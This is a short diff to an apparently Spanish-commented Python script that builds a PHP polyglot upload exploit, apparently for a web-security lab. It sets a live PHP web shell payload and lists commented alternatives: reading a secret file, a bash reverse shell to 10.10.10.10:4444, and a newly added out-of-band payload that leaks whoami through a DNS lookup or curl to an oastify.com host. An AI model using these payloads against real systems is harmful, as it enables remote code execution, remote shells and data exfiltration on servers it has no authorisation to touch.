@@ -7,6 +7,7 @@ import base64, os, shutil, subprocess, sys
 PAYLOAD = '<?php echo system($_GET["cmd"]); ?>'                 # (A) web shell ?cmd=
 # PAYLOAD = '<?php echo file_get_contents("/home/carlos/secret"); ?>'  # (B) secreto
 # PAYLOAD = "<?php exec(\"bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'\"); ?>"  # (C) reverse
+# PAYLOAD = '<?php system("nslookup $(whoami).YOUR-ID.oastify.com"); ?>'  # (D) OAST/DNS (Collaborator): confirma RCE ciego y exfiltra whoami en el subdominio (alt: curl http://YOUR-ID.oastify.com)
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 OUT = os.path.join(HERE, "exploit.php")            # polyglot de salida
